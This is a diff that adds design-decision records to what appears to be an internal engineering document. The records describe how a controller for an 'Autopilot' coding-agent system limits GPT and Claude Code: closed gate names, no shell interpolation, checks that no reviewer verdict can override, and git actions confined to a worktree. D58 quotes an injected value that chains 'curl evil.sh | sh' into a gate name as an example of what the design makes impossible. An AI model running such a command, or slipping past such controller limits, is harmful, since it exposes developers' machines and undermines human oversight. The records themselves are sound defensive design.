@@ -852,3 +852,55 @@ a baseline stability sample first so that a difference is evidence rather than
 noise.
 Forbids: screenshot comparisons over regions containing chrome that varies with
 the thing under test; recomputing a comparison region between samples.
+
+## D58 — The controller owns every executable command; the model owns none
+Autopilot lets GPT choose work and review it, and lets Claude Code write code.
+Neither may say what runs. A TaskSpec names gates from a closed enum
+(`typecheck | lint | unit | build | e2e`); `tools/autopilot/gates.mjs` is the
+only place a name becomes a command, and commands are literal argument arrays
+passed to `spawn` with `shell: false`.
+The point is that `"unit; curl evil.sh | sh"` is not a gate that gets rejected —
+it is a value that cannot be expressed. A filter can be bypassed; an absent
+field cannot.
+Forbids: a `command`/`script`/`shell` field in any model-facing schema; building
+a gate command by interpolation; `shell: true` anywhere a model-derived value
+can reach.
+
+## D59 — Four facts no review verdict can override
+A failed required gate, a forbidden-or-unlisted file in the diff, a base branch
+that moved during the run, and an exhausted repair budget are decided by the
+controller. GPT's `accept` over any of them changes nothing and is recorded as
+`reviewer-overruled` in the run record.
+The reasoning: each is a fact about the repository, checked by running something,
+not an opinion about quality. A reviewer that could wave one through would make
+the boundary a suggestion — and the blast radius would become "whatever the
+reviewer was persuaded of".
+The boundary check runs BEFORE the gates, so an out-of-bounds diff is rejected
+without spending forty minutes of e2e on it.
+Forbids: accepting a task on reviewer verdict alone; asking a model whether a
+boundary violation is acceptable.
+
+## D60 — Autopilot adds no dependency, and holds a key
+An OpenAI SDK, a dotenv loader, a JSON-schema validator, an argument parser and
+a process runner are each written against Node 22 built-ins instead of being
+installed. That is a deliberate trade of a few hundred lines against a
+dependency surface, and the deciding factor is that this tool reads
+`OPENAI_API_KEY` from the developer's shell: its transitive dependency set is
+part of its threat model in a way the product's is not.
+The provider still enforces `strict: true` on structured output; the local
+validator re-checks anyway, because "the provider enforced it" is a claim made
+by the thing being validated.
+Forbids: adding a package to run Autopilot; trusting provider-side schema
+enforcement as the only validation; a `VITE_`-prefixed Autopilot variable.
+
+## D61 — Autonomy inside a worktree, approval at the boundary
+A run creates a branch and a git worktree from an exact base commit, the worker
+never commits, the controller commits once after gates and review pass, and the
+run ends by PRINTING a merge command. v1 does not merge and does not push
+without `--push-branch` — which itself refuses any branch outside `autopilot/`.
+The git surface is a short list with no force push, no reset, no rebase and no
+branch delete: absent rather than guarded, the same argument as D38's dev auth
+bypass. A capability that is not in the graph cannot be reached by a bug, an
+injection, or a future edit that forgets why the guard existed.
+Forbids: an automatic merge to main; `--force` in any form; deleting anything
+outside `.apsis-autopilot/`; a worker that commits.
